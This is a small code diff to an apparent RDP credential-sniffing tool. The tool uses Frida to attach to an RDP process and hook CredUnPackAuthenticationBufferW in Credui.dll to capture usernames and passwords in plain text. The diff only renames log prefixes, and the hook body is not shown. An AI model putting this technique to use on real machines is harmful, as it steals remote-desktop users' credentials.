@@ -8,9 +8,9 @@ def wait_for():
 
 def hook(pid):
     try:
-        print("[+] Trying To Attach To RDP")
+        print("[ rdp-hook ] Trying To Attach To RDP")
         session = frida.attach(pid)
-        print(f"[+] Attached To RDP with pid {pid}!")
+        print(f"[ rdp-hook ] Attached To RDP with pid {pid}!")
 
         # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
         hook = session.create_script("""
@@ -44,5 +44,5 @@ def hook(pid):
         hook.load()
 
     except Exception as e:
-        print("[-] Unhandled exception: " + str(e))
-        print("[-] Continuing...")
+        print("[ rdp-hook ] Unhandled exception: " + str(e))
+        print("[ rdp-hook ] Continuing...")
